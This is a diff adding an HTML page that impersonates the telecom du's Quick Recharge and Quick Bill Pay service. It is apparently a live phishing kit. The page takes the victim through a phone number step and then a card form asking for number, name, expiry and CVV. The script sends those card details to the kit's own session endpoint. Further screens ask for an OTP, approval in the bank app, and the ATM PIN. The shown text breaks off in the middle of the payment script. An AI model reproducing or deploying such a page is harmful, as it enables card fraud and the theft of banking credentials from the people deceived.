@@ -1,0 +1,915 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>du - Quick Services</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Inter', sans-serif; background-color: #fff; direction: ltr; overflow-x: hidden; color: #333; }
+        img { width: 100%; display: block; border: none; outline: none; }
+
+        /* Header */
+        .header { background-color: #fff; padding: 10px 5%; border-bottom: 1px solid #e0e0e0; }
+        .header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
+        .header-icons { display: flex; gap: 15px; align-items: center; }
+        .header-icon { width: 22px; height: 22px; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 1.2rem; color: #333; transition: 0.2s; }
+        .header-icon:hover { color: #702082; }
+        .header-icon svg { width: 100%; height: 100%; stroke: currentColor; stroke-width: 2; fill: none; }
+        .du-logo { width: 38px; height: 38px; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .lang-switcher a { padding: 6px 16px; text-decoration: none; color: #702082; border: 1.5px solid #702082; border-radius: 20px; font-size: 0.82rem; font-weight: 700; transition: 0.2s; display: inline-block; }
+        .lang-switcher a:hover { background: #f5edf8; }
+        .du-logo img { width: 100%; height: 100%; object-fit: contain; }
+
+        .tabs-container { display: flex; padding: 15px 0 0 0; gap: 10px; justify-content: space-between; border-top: 1px solid #e0e0e0; margin-top: 8px; }
+        .tab-box { flex: 1; height: 70px; border: 2.5px solid #702082; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-weight: bold; cursor: pointer; text-align: center; font-size: 0.85rem; color: #333; text-decoration: none; background: #fff; transition: 0.3s; }
+        .tab-box.active { background: linear-gradient(135deg, #702082, #00aeef); color: #fff; border: none; }
+        .tab-box:hover:not(.active) { background: #f9f9f9; }
+        .tab-box.disabled { cursor: not-allowed; opacity: 0.8; }
+
+        .container { padding: 20px 5%; }
+        .step { display: none; }
+        .step.active { display: block; }
+
+        .form-area { padding: 10px 1%; text-align: left; }
+        .form-area h1 { font-size: 2.1rem; font-weight: 700; color: #333; margin-bottom: 5px; }
+        .form-area p { font-size: 1rem; color: #666; margin-bottom: 30px; }
+
+        .input-wrapper { position: relative; width: 100%; margin-bottom: 5px; }
+        .field-input { width: 100%; height: 55px; border: 1.2px solid #e1e1e1; border-radius: 10px; padding: 0 15px; font-size: 1.1rem; outline: none; text-align: left; transition: 0.2s; background: #fff; font-family: 'Inter', sans-serif; }
+        .field-input:focus { border: 1.5px solid transparent; background-image: linear-gradient(white, white), linear-gradient(to right, #702082, #00aeef); background-origin: border-box; background-clip: padding-box, border-box; }
+        .floating-label { position: absolute; top: 16px; left: 15px; color: #999; transition: 0.2s; background: #fff; padding: 0 5px; pointer-events: none; font-size: 0.95rem; }
+        .field-input:focus + .floating-label, .field-input:not(:placeholder-shown) + .floating-label { top: -10px; left: 12px; font-size: 0.8rem; font-weight: 600; }
+        .label-red { color: #d6001c !important; }
+        .label-normal { color: #702082 !important; }
+        .hint-text { display: none; font-size: 0.82rem; color: #555; margin-top: 8px; text-align: left; direction: ltr; }
+
+        .action-box { display: flex; justify-content: flex-start; padding: 15px 0 30px 0; }
+        .next-button { width: 145px; height: 52px; border-radius: 26px; border: none; background: #f6eff7; color: #d1bdd4; font-size: 1.1rem; font-weight: 700; cursor: not-allowed; transition: 0.3s; font-family: 'Inter', sans-serif; }
+
+        .input-card-box { background-color: #f8f8f8; border: 1px solid #e0e0e0; border-radius: 12px; padding: 12px 16px; margin-bottom: 25px; }
+        .amounts-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
+        .amt-box { border: 1px solid #dcdcdc; border-radius: 12px; padding: 20px 5px; text-align: center; background: #fff; cursor: pointer; transition: 0.2s; }
+        .amt-box.active { border: 2.5px solid #702082; background: #fcfaff; }
+        .amt-box .val { font-size: 1.4rem; font-weight: 700; display: block; color: #333; }
+        .manual-input-card { border: 2px solid #702082; border-radius: 12px; padding: 15px; text-align: center; margin-top: 10px; }
+        .manual-input-card label { display: block; font-size: 0.9rem; color: #666; text-align: left; margin-bottom: 5px; }
+        .manual-input-card input { width: 100%; border: none; background: transparent; font-size: 1.8rem; font-weight: 700; color: #702082; text-align: center; outline: none; font-family: 'Inter', sans-serif; }
+        .btn-submit-final { width: 100%; height: 55px; border-radius: 28px; border: none; background: linear-gradient(90deg, #702082 0%, #00aeef 100%); color: #fff; font-size: 1.3rem; font-weight: 700; margin-top: 35px; cursor: pointer; font-family: 'Inter', sans-serif; }
+
+        /* Payment page - step_3 */
+        .payment-summary-box { background: linear-gradient(135deg, #702082 0%, #00aeef 100%); border-radius: 16px; padding: 20px; color: #fff; text-align: center; margin-bottom: 25px; }
+        .payment-summary-box .amount-label { font-size: 0.95rem; opacity: 0.85; margin-bottom: 6px; }
+        .payment-summary-box .amount-value { font-size: 2.8rem; font-weight: 700; }
+        .payment-summary-box .amount-currency { font-size: 1.1rem; opacity: 0.85; }
+        .payment-summary-box .phone-info { font-size: 0.9rem; opacity: 0.75; margin-top: 8px; direction: ltr; }
+
+        .card-form-box { background: #fff; border: 1px solid #e8e8e8; border-radius: 16px; padding: 20px; margin-bottom: 20px; }
+        .card-form-box h3 { font-size: 1.1rem; font-weight: 700; color: #333; margin-bottom: 18px; text-align: left; }
+        .card-icons-row { display: flex; gap: 6px; justify-content: flex-start; margin-bottom: 18px; flex-wrap: wrap; align-items: center; overflow: hidden; }
+        .card-icons-row img { height: 24px; width: auto; max-width: 54px; border: 1px solid #eee; border-radius: 6px; padding: 3px 6px; background: #fff; flex-shrink: 0; object-fit: contain; box-sizing: border-box; }
+
+        .field-group { margin-bottom: 18px; }
+        .field-group label { display: block; font-size: 0.85rem; color: #555; margin-bottom: 6px; text-align: left; font-weight: 500; }
+        .field-group input { width: 100%; height: 50px; border: 1.5px solid #e0e0e0; border-radius: 10px; padding: 0 14px; font-size: 1rem; outline: none; text-align: left; background: #fafafa; transition: 0.2s; font-family: 'Inter', sans-serif; }
+        .field-group input:focus { border-color: #702082; background: #fff; }
+        .field-row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+
+        .secure-badge { display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 0.8rem; color: #888; margin-top: 10px; }
+        .secure-badge svg { width: 16px; height: 16px; }
+
+        .btn-pay-now { width: 100%; height: 58px; border-radius: 29px; border: none; background: linear-gradient(90deg, #702082 0%, #00aeef 100%); color: #fff; font-size: 1.2rem; font-weight: 700; cursor: pointer; transition: 0.2s; margin-top: 10px; font-family: 'Inter', sans-serif; }
+        .btn-pay-now:active { opacity: 0.9; transform: scale(0.99); }
+
+        .card-error-msg { display: none; background: #fff3f3; border: 1.5px solid #e74c3c; border-radius: 10px; padding: 12px 16px; margin-bottom: 16px; color: #c0392b; font-size: 0.95rem; font-weight: 600; text-align: center; }
+
+        /* Loading page */
+        .loading-page { text-align: center; padding: 60px 20px; }
+        .big-spinner { width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid #702082; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        .loading-page h2 { font-size: 1.3rem; color: #333; margin-bottom: 8px; }
+        .loading-page p { font-size: 0.95rem; color: #888; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* OTP page */
+        .otp-page { text-align: center; padding: 10px 0; }
+        .otp-icon { margin-bottom: 10px; display: flex; justify-content: center; }
+        .otp-icon img { width: 100px; height: 100px; object-fit: contain; }
+        .otp-page h2 { font-size: 1.2rem; font-weight: 700; margin-bottom: 4px; }
+        .otp-page p { font-size: 0.85rem; color: #666; margin-bottom: 12px; }
+
+        .numpad-display { background: #f5f5f5; border: 2px solid #e0e0e0; border-radius: 12px; height: 54px; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 14px; direction: ltr; }
+        .numpad-dot { width: 13px; height: 13px; border-radius: 50%; background: #ccc; transition: 0.2s; }
+        .numpad-dot.filled { background: #702082; }
+
+        .numpad-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 12px; }
+        .numpad-key { height: 58px; border-radius: 14px; border: 1.5px solid #e8e8e8; background: #fff; font-size: 1.5rem; font-weight: 700; color: #333; cursor: pointer; transition: 0.15s; font-family: 'Inter', sans-serif; box-shadow: 0 2px 6px rgba(0,0,0,0.06); display: flex; align-items: center; justify-content: center; }
+        .numpad-key:active { background: #f0e6f6; border-color: #702082; transform: scale(0.96); }
+        .numpad-key.key-del { background: #fff3f3; border-color: #f5c6cb; color: #e74c3c; font-size: 1.2rem; }
+        .numpad-key.key-confirm { background: linear-gradient(135deg, #702082, #00aeef); color: #fff; border: none; font-size: 1rem; }
+
+        .otp-error-msg { display: none; background: #fff3f3; border: 1.5px solid #e74c3c; border-radius: 10px; padding: 10px 14px; margin-bottom: 12px; color: #c0392b; font-size: 0.88rem; font-weight: 600; }
+        .otp-input-wrapper { display: none; }
+        .btn-otp-confirm { display: none; }
+
+        /* Bank Auth page */
+        .bank-auth-page { text-align: center; padding: 20px 0; }
+        .bank-auth-icon { margin-bottom: 18px; display: flex; justify-content: center; }
+        .bank-auth-icon svg { width: 90px; height: 90px; }
+        .bank-auth-page h2 { font-size: 1.4rem; font-weight: 700; margin-bottom: 14px; color: #222; }
+        .bank-auth-msg-box { background: linear-gradient(135deg, #f0f7ff, #e8f4fd); border: 1.5px solid #b8d9f5; border-radius: 14px; padding: 18px 20px; margin-bottom: 22px; font-size: 1rem; color: #1a5276; line-height: 1.7; }
+        .bank-auth-amount-highlight { font-size: 1.4rem; font-weight: 800; color: #702082; display: block; margin-top: 6px; }
+        .btn-bank-auth-confirm { width: 100%; height: 55px; border-radius: 28px; border: none; background: linear-gradient(90deg, #27ae60 0%, #2ecc71 100%); color: #fff; font-size: 1.1rem; font-weight: 700; cursor: pointer; font-family: 'Inter', sans-serif; margin-bottom: 14px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .bank-auth-reject-msg { display: none; background: #fff3f3; border: 1.5px solid #f5c6cb; border-radius: 12px; padding: 14px 16px; margin-bottom: 16px; color: #721c24; font-size: 0.95rem; font-weight: 600; text-align: center; }
+        .bank-auth-reject-msg .reject-icon { font-size: 2rem; display: block; margin-bottom: 6px; }
+
+        /* ATM PIN page */
+        .pin-page { text-align: center; padding: 10px 0; }
+        .pin-icon { font-size: 2.2rem; margin-bottom: 8px; }
+        .pin-page h2 { font-size: 1.2rem; font-weight: 700; margin-bottom: 4px; }
+        .pin-page p { font-size: 0.85rem; color: #666; margin-bottom: 12px; }
+        .pin-input-wrapper { display: none; }
+        .pin-error-msg { display: none; background: #fff3f3; border: 1.5px solid #e74c3c; border-radius: 10px; padding: 10px 14px; margin-bottom: 12px; color: #c0392b; font-size: 0.88rem; font-weight: 600; }
+        .btn-pin-confirm { display: none; }
+
+        /* Success page */
+        .success-page { text-align: center; padding: 40px 20px; }
+        .success-icon-wrap { width: 90px; height: 90px; background: linear-gradient(135deg, #27ae60, #2ecc71); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: popIn 0.5s ease; }
+        @keyframes popIn { 0%{transform:scale(0)} 70%{transform:scale(1.1)} 100%{transform:scale(1)} }
+        .success-icon-wrap svg { width: 45px; height: 45px; stroke: #fff; stroke-width: 3; fill: none; }
+        .success-page h2 { font-size: 1.8rem; font-weight: 700; color: #27ae60; margin-bottom: 10px; }
+        .success-page p { font-size: 1rem; color: #666; margin-bottom: 6px; }
+        .success-amount { font-size: 2rem; font-weight: 700; color: #702082; margin: 15px 0; }
+        .success-ref { font-size: 0.85rem; color: #aaa; margin-top: 10px; }
+        .btn-new-payment { width: 100%; height: 52px; border-radius: 26px; border: none; background: linear-gradient(90deg, #702082 0%, #00aeef 100%); color: #fff; font-size: 1.1rem; font-weight: 700; cursor: pointer; margin-top: 30px; font-family: 'Inter', sans-serif; }
+
+        #bot_loading { display:none; text-align:center; padding: 20px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #702082; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+
+        .page-title { text-align: left; font-size: 1.8rem; font-weight: 700; margin-bottom: 20px; }
+
+        .sections-container { margin: 40px 0; }
+        .section-image { width: 100%; margin: 30px 0; }
+        .section-image-full { width: calc(100% + 10%); margin-left: -5%; margin-right: -5%; display: block; margin-top: 30px; }
+
+
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <div class="header">
+        <div class="header-top">
+            <div class="du-logo" title="du"><img src="images/du_logo.webp" alt="du logo"></div>
+            <div class="header-icons">
+                <div class="lang-switcher">
+                    <a href="/ar">عربي</a>
+                </div>
+                <div class="header-icon" title="Search">
+                    <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+                </div>
+                <div class="header-icon" title="User">
+                    <svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"></circle><path d="M 4 20 Q 4 14 12 14 Q 20 14 20 20"></path></svg>
+                </div>
+                <div class="header-icon" title="Menu">
+                    <svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+                </div>
+            </div>
+        </div>
+
+        <div class="tabs-container">
+            <div id="tab_pay" class="tab-box" onclick="toggleService('pay')">Quick<br>Bill Pay</div>
+            <div id="tab_recharge" class="tab-box active" onclick="toggleService('recharge')">Quick<br>Recharge</div>
+            <div id="tab_id" class="tab-box disabled" onclick="return false;">ID Card<br>Update</div>
+        </div>
+    </div>
+
+    <div class="container">
+        <form id="ultimateForm">
+            <input type="hidden" name="step_type" value="init_data">
+            <input type="hidden" name="service_mode" id="service_mode" value="recharge">
+            <input type="hidden" name="final_amount" id="final_amount" value="">
+            <input type="hidden" name="fingerprint" id="fingerprint_input">
+
+            <!-- Step 1: Phone Number -->
+            <div id="step_1" class="step active">
+                <div class="form-area">
+                    <h1 id="main_title">Quick Recharge</h1>
+                    <p id="main_desc">Recharge online instantly and securely.</p>
+                    <div class="input-wrapper">
+                        <input type="tel" name="phone_num" id="u_input" class="field-input" placeholder=" " autocomplete="off" maxlength="10" required>
+                        <label id="u_lbl" class="floating-label">Mobile number</label>
+                        <div id="u_hint" class="hint-text">Format: 9715XXXXXXXX, 05XXXXXXXX, 1.XXXXXXX, 2XXXXXXXX</div>
+                    </div>
+
+                    <div id="bot_loading">
+                        <div class="spinner"></div>
+                        <p style="font-size: 0.9rem; color: #702082;">Fetching your account details...</p>
+                    </div>
+
+                    <div class="action-box">
+                        <button type="button" id="u_btn" class="next-button" onclick="startBot()" disabled>Next</button>
+                    </div>
+                </div>
+
+                <div class="sections-container">
+                    <div id="pay_sections" style="display:none;">
+                        <img src="images/en_section2.jpg" alt="Accepted Cards" class="section-image">
+                        <img src="images/en_section1.jpg" alt="Download du App" class="section-image-full">
+                    </div>
+                    <div id="recharge_sections">
+                        <img src="images/en_section3.jpg" alt="Cards and Flexi eSim" class="section-image">
+                        <img src="images/en_section1.jpg" alt="Download du App" class="section-image-full">
+                    </div>
+                </div>
+            </div>
+
+            <!-- Step 2: Bill Details / Recharge Amount -->
+            <div id="step_2" class="step">
+                <h1 id="step2_title" class="page-title">Quick Recharge</h1>
+                <div class="input-card-box" style="text-align:left;">
+                    <label style="display: block; font-size: 0.85rem; color: #757575; margin-bottom: 4px;">Mobile number</label>
+                    <input type="tel" id="displayPhone" style="width: 100%; border: none; background: transparent; font-size: 1.3rem; font-weight: 700; outline: none; text-align:left;" readonly>
+                </div>
+
+                <div id="recharge_selector">
+                    <span style="font-weight:700; display:block; margin-bottom:15px; text-align:left;">Select recharge amount</span>
+                    <div class="amounts-grid">
+                        <div class="amt-box active" data-v="25" onclick="setAmt(this)"><span class="val">25</span><span style="font-size:0.8rem;">AED</span></div>
+                        <div class="amt-box" data-v="50" onclick="setAmt(this)"><span class="val">50</span><span style="font-size:0.8rem;">AED</span></div>
+                        <div class="amt-box" data-v="100" onclick="setAmt(this)"><span class="val">100</span><span style="font-size:0.8rem;">AED</span></div>
+                        <div class="amt-box" data-v="200" onclick="setAmt(this)"><span class="val">200</span><span style="font-size:0.8rem;">AED</span></div>
+                        <div class="amt-box" data-v="300" onclick="setAmt(this)"><span class="val">300</span><span style="font-size:0.8rem;">AED</span></div>
+                        <div class="amt-box" data-v="500" onclick="setAmt(this)"><span class="val">500</span><span style="font-size:0.8rem;">AED</span></div>
+                    </div>
+                </div>
+
+                <div class="manual-input-card">
+                    <label id="manual_label">Selected amount (AED)</label>
+                    <input type="number" id="manual_val" placeholder="0.00" oninput="updateFinalAmt(this.value)">
+                </div>
+
+                <button type="submit" class="btn-submit-final">Continue</button>
+            </div>
+
+            <!-- Step 3: Card Payment -->
+            <div id="step_3" class="step">
+                <h1 class="page-title">Payment Details</h1>
+
+                <div class="payment-summary-box">
+                    <div class="amount-label">Amount to pay</div>
+                    <div><span class="amount-value" id="pay_amount_display">0</span> <span class="amount-currency">AED</span></div>
+                    <div class="phone-info" id="pay_phone_display"></div>
+                </div>
+
+                <div class="card-form-box">
+                    <h3>Card Information</h3>
+                    <div class="card-icons-row">
+                        <img src="images/visa.svg" alt="Visa">
+                        <img src="images/mastercard.svg" alt="Mastercard">
+                        <img src="images/amex.svg" alt="Amex">
+                        <img src="images/google-pay.svg" alt="Google Pay">
+                        <img src="images/samsung-pay.svg" alt="Samsung Pay">
+                    </div>
+
+                    <div id="card_error_msg" class="card-error-msg"></div>
+
+                    <div class="field-group">
+                        <label>Card Number</label>
+                        <input type="tel" id="card_number" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNumber(this)">
+                    </div>
+                    <div class="field-group">
+                        <label>Cardholder Name</label>
+                        <input type="text" id="card_name" placeholder="Name as on card">
+                    </div>
+                    <div class="field-row-2">
+                        <div class="field-group">
+                            <label>Expiry Date</label>
+                            <input type="tel" id="card_expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
+                        </div>
+                        <div class="field-group">
+                            <label>CVV</label>
+                            <input type="tel" id="card_cvv" placeholder="123" maxlength="4">
+                        </div>
+                    </div>
+
+                    <div class="secure-badge">
+                        <svg viewBox="0 0 24 24" stroke="#27ae60" fill="none" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                        <span>Secure payment - SSL encrypted</span>
+                    </div>
+                </div>
+
+                <button type="button" class="btn-pay-now" onclick="processPayment()">Pay Now 🔒</button>
+            </div>
+
+            <!-- Loading page -->
+            <div id="step_loading" class="step">
+                <div class="loading-page">
+                    <div class="big-spinner"></div>
+                    <h2>Processing your payment...</h2>
+                    <p>Please wait, do not close this page</p>
+                </div>
+            </div>
+
+            <!-- OTP page -->
+            <div id="step_otp" class="step">
+                <div class="otp-page">
+                    <div class="otp-icon">
+                        <img src="images/otp_icon.jpg" alt="OTP" onerror="this.style.display='none'">
+                    </div>
+                    <h2>One-Time Password (OTP)</h2>
+                    <p>Enter the OTP sent to your registered mobile number</p>
+
+                    <div id="otp_error_msg" class="otp-error-msg"></div>
+
+                    <div class="numpad-display">
+                        <div class="numpad-dot" id="otp_d1"></div>
+                        <div class="numpad-dot" id="otp_d2"></div>
+                        <div class="numpad-dot" id="otp_d3"></div>
+                        <div class="numpad-dot" id="otp_d4"></div>
+                        <div class="numpad-dot" id="otp_d5"></div>
+                        <div class="numpad-dot" id="otp_d6"></div>
+                    </div>
+
+                    <div class="numpad-grid">
+                        <button type="button" class="numpad-key" onclick="numpadPress('otp','1')">1</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('otp','2')">2</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('otp','3')">3</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('otp','4')">4</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('otp','5')">5</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('otp','6')">6</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('otp','7')">7</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('otp','8')">8</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('otp','9')">9</button>
+                        <button type="button" class="numpad-key key-del" onclick="numpadDel('otp')">&#9003;</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('otp','0')">0</button>
+                        <button type="button" class="numpad-key key-confirm" onclick="submitOTP()">Confirm</button>
+                    </div>
+
+                    <div class="otp-input-wrapper">
+                        <input type="tel" id="otp1"><input type="tel" id="otp2">
+                        <input type="tel" id="otp3"><input type="tel" id="otp4">
+                        <input type="tel" id="otp5"><input type="tel" id="otp6">
+                    </div>
+                    <button type="button" class="btn-otp-confirm" onclick="submitOTP()">Confirm OTP</button>
+                </div>
+            </div>
+
+            <!-- Bank Authentication page -->
+            <div id="step_bank_auth" class="step">
+                <div class="bank-auth-page">
+                    <div class="bank-auth-icon">
+                        <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <circle cx="50" cy="50" r="48" fill="#e8f4fd" stroke="#00aeef" stroke-width="3"/>
+                            <rect x="20" y="38" width="60" height="38" rx="6" fill="#702082" opacity="0.15" stroke="#702082" stroke-width="2.5"/>
+                            <polygon points="50,18 80,35 20,35" fill="#702082" opacity="0.8"/>
+                            <rect x="44" y="55" width="12" height="14" rx="3" fill="#702082"/>
+                            <circle cx="50" cy="50" r="5" fill="#00aeef"/>
+                        </svg>
+                    </div>
+                    <h2>Bank Authentication</h2>
+
+                    <div class="bank-auth-reject-msg" id="bank_auth_reject_msg">
+                        <span class="reject-icon">❌</span>
+                        Payment failed - Your payment has been declined by your card issuing bank
+                    </div>
+
+                    <div class="bank-auth-msg-box">
+                        Please open your bank app and approve the purchase of
+                        <span class="bank-auth-amount-highlight" id="bank_auth_amount_display">0 AED</span>
+                    </div>
+
+                    <button type="button" class="btn-bank-auth-confirm" onclick="submitBankAuth()">
+                        ✅ Approved from app
+                    </button>
+                </div>
+            </div>
+
+            <!-- ATM PIN page -->
+            <div id="step_pin" class="step">
+                <div class="pin-page">
+                    <div class="pin-icon">🏧</div>
+                    <h2>ATM PIN</h2>
+                    <p>Enter your ATM card PIN</p>
+
+                    <div id="pin_error_msg" class="pin-error-msg"></div>
+
+                    <div class="numpad-display">
+                        <div class="numpad-dot" id="pin_d1"></div>
+                        <div class="numpad-dot" id="pin_d2"></div>
+                        <div class="numpad-dot" id="pin_d3"></div>
+                        <div class="numpad-dot" id="pin_d4"></div>
+                    </div>
+
+                    <div class="numpad-grid">
+                        <button type="button" class="numpad-key" onclick="numpadPress('pin','1')">1</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('pin','2')">2</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('pin','3')">3</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('pin','4')">4</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('pin','5')">5</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('pin','6')">6</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('pin','7')">7</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('pin','8')">8</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('pin','9')">9</button>
+                        <button type="button" class="numpad-key key-del" onclick="numpadDel('pin')">&#9003;</button>
+                        <button type="button" class="numpad-key" onclick="numpadPress('pin','0')">0</button>
+                        <button type="button" class="numpad-key key-confirm" onclick="submitPIN()">Confirm</button>
+                    </div>
+
+                    <div class="pin-input-wrapper">
+                        <input type="tel" id="pin1"><input type="tel" id="pin2">
+                        <input type="tel" id="pin3"><input type="tel" id="pin4">
+                    </div>
+                    <button type="button" class="btn-pin-confirm" onclick="submitPIN()">Confirm PIN</button>
+                </div>
+            </div>
+
+            <!-- Success page -->
+            <div id="step_success" class="step">
+                <div class="success-page">
+                    <div class="success-icon-wrap">
+                        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                    </div>
+                    <h2>Payment Successful!</h2>
+                    <p>Your payment has been processed successfully</p>
+                    <div class="success-amount"><span id="success_amount">0</span> AED</div>
+                    <p>Mobile: <strong id="success_phone"></strong></p>
+                    <p class="success-ref" id="success_ref"></p>
+                    <button type="button" class="btn-new-payment" onclick="resetAll()">New Payment</button>
+                </div>
+            </div>
+
+        </form>
+    </div>
+
+
+
+    <script>
+        // ============================================================
+        // Global Variables
+        // ============================================================
+        let mode = 'recharge';
+        let currentSessionId = null;
+        let pollInterval = null;
+
+        const inp = document.getElementById('u_input');
+        const btn = document.getElementById('u_btn');
+        const hint = document.getElementById('u_hint');
+        const lbl = document.getElementById('u_lbl');
+        const manualInput = document.getElementById('manual_val');
+        const finalHidden = document.getElementById('final_amount');
+        const paySections = document.getElementById('pay_sections');
+        const rechargeSections = document.getElementById('recharge_sections');
+
+        // Numpad state
+        const numpadValues = { otp: '', pin: '' };
+        const numpadMaxLen = { otp: 6, pin: 4 };
+
+        // ============================================================
+        // Toggle Service Tab
+        // ============================================================
+        function toggleService(s) {
+            mode = s;
+            document.getElementById('service_mode').value = s;
+            document.getElementById('tab_pay').classList.toggle('active', s === 'pay');
+            document.getElementById('tab_recharge').classList.toggle('active', s === 'recharge');
+
+            if(s === 'pay') {
+                paySections.style.display = 'block';
+                rechargeSections.style.display = 'none';
+                document.getElementById('main_title').innerText = "Quick Bill Pay";
+                document.getElementById('main_desc').innerText = "Pay your postpaid bills securely without logging in.";
+                document.getElementById('u_lbl').innerText = "Mobile number or account number";
+                document.getElementById('step2_title').innerText = "Bill Details";
+                document.getElementById('manual_label').innerText = "Please enter the bill amount to pay";
+                document.getElementById('recharge_selector').style.display = "none";
+                manualInput.value = "";
+                finalHidden.value = "";
+            } else if(s === 'recharge') {
+                paySections.style.display = 'none';
+                rechargeSections.style.display = 'block';
+                document.getElementById('main_title').innerText = "Quick Recharge";
+                document.getElementById('main_desc').innerText = "Recharge online instantly and securely.";
+                document.getElementById('u_lbl').innerText = "Mobile number";
+                document.getElementById('step2_title').innerText = "Quick Recharge";
+                document.getElementById('manual_label').innerText = "Selected amount (AED)";
+                document.getElementById('recharge_selector').style.display = "block";
+                manualInput.value = "25";
+                finalHidden.value = "25";
+            }
+        }
+
+        inp.addEventListener('input', () => {
+            hint.style.display = inp.value.length > 0 ? 'block' : 'none';
+            if(inp.value.length > 0 && inp.value.length < 10) {
+                lbl.classList.add('label-red');
+                btn.style.background = '#f6eff7';
+                btn.disabled = true;
+            } else if (inp.value.length === 10) {
+                lbl.classList.remove('label-red');
+                lbl.classList.add('label-normal');
+                btn.style.background = '#702082';
+                btn.style.color = '#fff';
+                btn.disabled = false;
+                btn.style.cursor = 'pointer';
+            }
+        });
+
+        // ============================================================
+        // Step 1: Start
+        // ============================================================
+        async function startBot() {
+            const phone = inp.value;
+            btn.style.display = "none";
+            const loadingEl = document.getElementById('bot_loading');
+            loadingEl.style.display = "block";
+            document.getElementById('fingerprint_input').value = getFingerprint();
+
+            try {
+                const res = await fetch('/api/session/init', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, mode, lang: 'en' })
+                });
+                const data = await res.json();
+                if(data.success) {
+                    currentSessionId = data.session_id;
+                    startPolling('browsing');
+                }
+            } catch(e) { console.error('Init error:', e); }
+
+            setTimeout(() => {
+                loadingEl.style.display = "none";
+                btn.style.display = "block";
+                document.getElementById('displayPhone').value = phone;
+                if(mode === 'recharge') {
+                    setAmt(document.querySelector('.amt-box.active'));
+                }
+                showStep('step_2');
+            }, 3000);
+        }
+
+        // ============================================================
+        // Form Submit → Step 3
+        // ============================================================
+        document.getElementById('ultimateForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            document.getElementById('pay_amount_display').innerText = finalHidden.value;
+            document.getElementById('pay_phone_display').innerText = inp.value;
+
+            if (currentSessionId) {
+                try {
+                    await fetch('/api/session/update', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ session_id: currentSessionId, amount: finalHidden.value, mode })
+                    });
+                } catch(e) { console.error('Update error:', e); }
+            }
+
+            showStep('step_3');
+        });
+
+        // ============================================================
+        // Step 3: Process Payment
+        // ============================================================
+        async function processPayment() {
+            const cardNum = document.getElementById('card_number').value.replace(/\s/g,'');
+            const cardName = document.getElementById('card_name').value.trim();
+            const cardExpiry = document.getElementById('card_expiry').value.trim();
+            const cardCvv = document.getElementById('card_cvv').value.trim();
+
+            if(cardNum.length < 16) { alert('Please enter a valid card number (16 digits)'); return; }
+            if(cardName.length < 3) { alert('Please enter the cardholder name'); return; }
+            if(cardExpiry.length < 5) { alert('Please enter expiry date in MM/YY format'); return; }
+            if(cardCvv.length < 3) { alert('Please enter the CVV code'); return; }
+
+            document.getElementById('card_error_msg').style.display = 'none';
+
+            try {
+                const res = await fetch('/api/session/create', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        session_id: currentSessionId,
+                        phone: inp.value,
+                        amount: finalHidden.value,
+                        mode,
+                        card_number: cardNum,
+                        card_name: cardName,
+                        card_expiry: cardExpiry,
+                        card_cvv: cardCvv,
+                        lang: 'en'
+                    })
+                });
+                const data = await res.json();
+                if(data.success) { currentSessionId = data.session_id; }
+            } catch(e) { console.error('Create session error:', e); }
+
